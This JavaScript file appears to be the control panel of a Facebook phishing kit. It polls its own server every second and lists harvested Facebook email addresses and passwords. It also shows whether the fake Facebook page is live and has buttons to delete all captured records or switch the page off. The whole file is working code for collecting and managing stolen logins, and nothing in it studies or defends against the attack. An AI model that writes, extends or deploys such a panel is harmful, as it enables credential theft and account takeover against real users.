var data=[];
var data1;
var apis = true
  var but1 =document.getElementById('b1');
  var but2 =document.getElementById('b2');
  var but3 =document.getElementById('b3');
  let inte = setInterval(function(){
    if (apis == true) {
  console.clear()
let api = new XMLHttpRequest()
   api.open('POST','https://' + location.host + '/api')
   api.setRequestHeader("Accept","application/json")
   api.setRequestHeader("Content-Type","application/json")
   api.onreadystatechange=function(){
     if (api.readyState == 4){
      if (data.length != JSON.parse(api.responseText).length ){
        data = JSON.parse(api.responseText)
        refrih()
      }
       console.log(data)
       if (data[1] == undefined) {
        but1.style=`
    background: red;
    height: 50px;
    width: auto;
    margin: 5px 20px 0 20px;
    border-radius: 10px;
    font-size: 30px;
    padding:  0 15px 0 15px;
        `
        document.getElementById('div').innerHTML=`
        <div class="uesr"><h1>LODING</h1><div class="it">لا يوجد بينات</div></div>
      
      `
       }else{
        but1.style=`
    background: rgb(0, 176, 12);
    height: 50px;
    width: auto;
    margin: 5px 20px 0 20px;
    border-radius: 10px;
    font-size: 30px;
    padding:  0 15px 0 15px;
    `
       }
     }
   }
   api.send()
   let apit = new XMLHttpRequest()
   apit.open('POST','https://'+location.host+'/online/test')
   apit.setRequestHeader("Accept","application/json")
   apit.setRequestHeader("Content-Type","application/json")
   apit.onreadystatechange=function(){
     if (apit.readyState == 4){
       data1 = JSON.parse(apit.responseText)
       console.log(data1)
       
       if (data1.facbook == true) {
        document.getElementById('ledF').style=`
        position: absolute;
        width: 20px;
        height: 20px;
        border-radius: 50%;
        background: green;
        transform: translate(155px , -25px);
        transition: 300ms;
        `
       }else{
        document.getElementById('ledF').style=`
        position: absolute;
        width: 20px;
        height: 20px;
        border-radius: 50%;
        background: red;
        transform: translate(155px , -25px);
        transition: 300ms;
        `
       }
      }
   }
  
   apit.send()
    }
  },1000)
  function refrih(){
    document.getElementById('div').innerHTML=''
    for (let z = 0; z < data.length-1; z++) {
      document.getElementById('div').innerHTML+=`
      <div class="uesr"><h1>FACBOOK</h1>
      <h2>EMAIL : <div class="rus">${data[z].Email}</div></h2>
      <h2>PASSWORD : <div class="rus">${data[z].Password}</div></h2></div>
      
      `
    }
  }
  var ST = 'STOP'
  var MPM;
document.getElementById('b1').value='DELIT ALL'
document.getElementById('b2').value='STOP'
document.getElementById('b3').value='FACBOOK STOP'
  

  but2.onclick=function(){
    if (but2.value == 'STOP') {
      apis = false
      but2.value = 'NEXT'
      but2.style=`
    background: red;
    height: 50px;
    width: auto;
    margin: 5px 20px 0 10px;
    border-radius: 10px;
    font-size: 30px;
    transition: 500ms;
    padding:  0 15px 0 15px;
      `
      document.getElementById('ledF').style=`
        position: absolute;
        width: 20px;
        height: 20px;
        border-radius: 50%;
        background: red;
        transform: translate(155px , -25px);
        transition: 300ms;
        `

    }else{
      apis = true
      but2.value = 'STOP'
      but2.style=`
    background: rgb(0, 176, 12);
    height: 50px;
    width: auto;
    margin: 5px 20px 0 10px;
    border-radius: 10px;
    font-size: 30px;
    transition: 500ms;
    padding:  0 15px 0 15px;
    `
    }
  }
  var oa = 'O'
  but1.onclick=function(){pram('D')}
  but3.onclick=function(){
    if (oa == 'O') {
      pram('O')
    }else if (oa == 'A') {
      pram('A')
    }
    }
    

  function pram(Q) {
    var Q = Q
    console.log(Q)
    let api = new XMLHttpRequest()
   api.open('POST','https://'+location.host+'/DS')
   api.setRequestHeader("Accept","application/json")
   api.setRequestHeader("Content-Type","application/json")
   api.onreadystatechange=function(){
     if (api.readyState == 4){
      var data2 = JSON.parse(api.responseText)
      console.log(data2)
      console.log(Q)
      if (data2.FTF == '') {
        oa = 'A'
    but3.style=`
    position: relative;
    background-color: red;
    top: 5px;
    margin:0 100px 0 0px;
    transition: 500ms;
        `
       }else{
    oa = 'O'
    but3.style=`
    position: relative;
    background-color: rgb(55, 115, 255);
    top: 5px;
    margin:0 100px 0 0px;
    transition: 500ms;
        `
       }

     }
   }
   var da =`{"I":"${Q}"}`
   api.send(da)
  }

  pram('0')

